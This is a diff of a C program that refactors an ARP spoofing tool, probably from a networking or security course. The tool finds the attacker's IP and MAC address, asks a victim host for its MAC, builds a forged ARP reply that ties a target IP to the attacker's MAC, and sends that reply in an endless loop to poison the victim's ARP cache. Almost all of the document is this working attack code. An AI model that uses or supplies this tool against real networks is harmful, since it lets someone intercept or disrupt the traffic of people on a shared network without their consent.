@@ -44,28 +44,14 @@ int main(int argc, char *argv[])
 	uint8_t            *arp_request_packet = (uint8_t *)calloc(1, sizeof(my_etharp_hdr));
 
 	my_etharp_hdr      *arp_reply          = (my_etharp_hdr *)calloc(1, sizeof(my_etharp_hdr));
-	uint8_t            *arp_reply_packet   = (uint8_t *)calloc(1, sizeof(my_etharp_hdr));
-	
+	uint8_t            *arp_reply_packet   = (uint8_t *)calloc(1, sizeof(my_etharp_hdr));	
+
 
 	inet_aton(argv[3], target_IP_struct);
 	target_IP_int = target_IP_struct->s_addr;
 	
 /* get attacker ip address */
-	int n;
-	struct ifreq ifr;
- 
-	n = socket(AF_INET, SOCK_DGRAM, 0);
-	
-	//Type of address to retrieve - IPv4 IP address
-	ifr.ifr_addr.sa_family = AF_INET;
-	
-	//Copy the interface name in the ifreq structure
-	strncpy(ifr.ifr_name, argv[1], IFNAMSIZ - 1);
-	ioctl(n, SIOCGIFADDR, &ifr);
-	close(n);
-	
-	strcpy(attacker_IP_char, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
-	//display result
+	GET_MY_IP(attacker_IP_char, dev);
 	printf("[Attacker IP  Address] "); PRINT_IP(attacker_IP_char);
 	puts("");
 	
@@ -73,34 +59,21 @@ int main(int argc, char *argv[])
 	attacker_IP_int = attacker_IP_struct->s_addr;
 
 /* get attacker mac address */
-	struct ifreq s;
-	int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
-	
-	strcpy(s.ifr_name, dev);
-	if (!ioctl(fd, SIOCGIFHWADDR, &s))
-	{
-		printf("[Attacker MAC Address] ");
-		for (int i = 0; i < 6; i++)
-		{
-			attacker_MAC_array[i] = s.ifr_addr.sa_data[i];
-		}
-		PRINT_MAC(attacker_MAC_array);
-		puts("");
-	}
-	puts("");
+	GET_MY_MAC(attacker_MAC_array, dev);
+	printf("[Attacker MAC Address] "); PRINT_MAC(attacker_MAC_array);
+	puts(""); puts("");
 
 /* send arp request broadcast */
-	printf("[Sender   IP  Address] %s\n\n", argv[2]);
+	printf("[Sender   IP  Address] %s", argv[2]);
+	puts(""); puts("");
 
 	inet_aton(argv[2], sender_IP_struct);
-
 	sender_IP_int = sender_IP_struct->s_addr;
 
 	printf("[+] Creating ARP request packet: ");
 	MAKE_ARPREQ_STRUCT(arp_request, attacker_MAC_array, attacker_IP_int, sender_IP_int);
-	printf("Done\n");
-	
-	memcpy(arp_request_packet, arp_request, sizeof(my_etharp_hdr));
+	STRUCT2PACKET(arp_request_packet, arp_request);
+	puts("Done");
 
 	printf("[+] Broadcasting ARP request, 5 times: ");
 	for (int i = 0; i < 5; i++)
@@ -118,43 +91,26 @@ int main(int argc, char *argv[])
 	puts("Done");
 
 	printf("[+] Getting sender MAC address from ARP reply packet: ");
-	while (1)
+	if (!GET_SENDER_MAC(sender_MAC_array, sender_IP_int, handle, header, packet))
 	{
-		int res = pcap_next_ex(handle, &header, &packet);
-	
-		if (res == 0)               continue;
-		if (res == -1 || res == -2) break;
-
-		uint16_t PCKT_ETHERTYPE = (packet[12] << 8) | packet[13];
-		if (PCKT_ETHERTYPE != ETHERTYPE_ARP) { continue; }
-
-		uint16_t PCKT_ARPOP = (packet[20] << 8) | packet[21];
-		if (PCKT_ARPOP != ARPOP_REPLY) { continue; }
-		
-		// compute regarding little-endian
-		uint32_t PCKT_ARPSPA = (packet[31] << 24) | (packet[30] << 16) | (packet[29] << 8) | (packet[28]);
-		if (PCKT_ARPSPA != sender_IP_int) { continue; }
-
-		memcpy(sender_MAC_array, (packet + 22), 6 * sizeof(uint8_t));
-
-		puts("Done\n");
-		printf("[Sender   MAC Address] "); PRINT_MAC(sender_MAC_array);
-		
-		puts("");
-		puts("");
-		break;
+		puts("[-] Fail!");
+		puts("[-] Exiting with -1");
+		return -1;
 	}
+	puts("DONE"); puts("");
+
+	printf("[Sender   MAC Address] "); PRINT_MAC(sender_MAC_array);
+	puts(""); puts("");	
 
 	printf("[+] Creating fake ARP reply packet: ");
-
 	MAKE_ARPREP_STRUCT(arp_reply, attacker_MAC_array, attacker_IP_int, sender_MAC_array, sender_IP_int, target_IP_int);
-	puts("Done");
-	
 	STRUCT2PACKET(arp_reply_packet, arp_reply);
-	memcpy(arp_reply_packet, arp_reply, sizeof(my_etharp_hdr));
+	puts("Done");	
 
 	puts("[+] Success!");
-	printf("[+] Repetitively sending fake ARP reply to sender: sender <%s> ARP table will be poisoned!\n", argv[2]);
+	printf("[+] Repetitively sending fake ARP reply to sender: sender <%s> will now identify target <%s> MAC as attacker MAC <", argv[2], argv[3]); PRINT_MAC(attacker_MAC_array); printf(">");
+	puts("");
+
 	while (1)
 	{
 		pcap_sendpacket(handle, arp_reply_packet, sizeof(my_etharp_hdr));
@@ -174,8 +130,4 @@ int main(int argc, char *argv[])
 
 	return 0;
 }
-
-
-
-
 
